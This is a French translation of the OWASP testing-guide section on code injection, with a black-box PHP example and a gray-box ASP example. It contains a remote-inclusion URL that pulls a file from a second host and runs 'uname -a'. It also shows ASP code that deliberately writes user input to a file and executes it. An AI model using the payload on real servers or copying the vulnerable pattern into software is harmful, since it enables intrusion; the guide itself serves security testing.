# Test d'injection de code

|ID          |
|------------|
|WSTG-INPV-11|

## Sommaire

Cette section décrit comment un testeur peut vérifier s'il est possible d'entrer du code en entrée sur une page Web et de le faire exécuter par le serveur Web.

Dans les tests [Code Injection](https://owasp.org/www-community/attacks/Code_Injection), un testeur soumet une entrée qui est traitée par le serveur Web sous forme de code dynamique ou de fichier inclus. Ces tests peuvent cibler divers moteurs de script côté serveur, par exemple ASP ou PHP. Des pratiques appropriées de validation des entrées et de codage sécurisé doivent être utilisées pour se protéger contre ces attaques.

## Objectifs des tests

- Identifiez les points d'injection où vous pouvez injecter du code dans l'application.
- Évaluer la sévérité de l'injection.

## Comment tester

### Test en boîte noire

#### Test des vulnérabilités d'injection PHP

À l'aide de la chaîne de requête, le testeur peut injecter du code (dans cet exemple, une URL malveillante) à traiter dans le cadre du fichier inclus :

`http://www.exemple.com/uptime.php?pin=http://www.exemple2.com/packx1/cs.jpg?&cmd=uname%20-a`

> L'URL malveillante est acceptée en paramètre de la page PHP, qui utilisera ultérieurement la valeur dans un fichier inclus.

### Test en boîte grise

#### Test des vulnérabilités d'injection de code ASP

Examinez le code ASP pour les entrées utilisateur utilisées dans les fonctions d'exécution. L'utilisateur peut-il saisir des commandes dans le champ de saisie Données ? Ici, le code ASP enregistrera l'entrée dans un fichier puis l'exécutera :

```asp
<%
If not isEmpty(Request( "Data" ) ) Then
Dim fso, f
'User input Data is written to a file named data.txt
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing

'Data.txt is executed
Server.Execute( "data.txt" )

Else
%>

<form>
<input name="Data" /><input type="submit" name="Enter Data" />

</form>
<%
End If
%>)))
```

### Références

- [Security Focus](http://www.securityfocus.com)
- [Insecure.org](http://www.insecure.org)
- [Wikipédia](http://www.wikipedia.org)
- [Révision du code pour l'injection de système d'exploitation](https://wiki.owasp.org/index.php/OS_Injection)
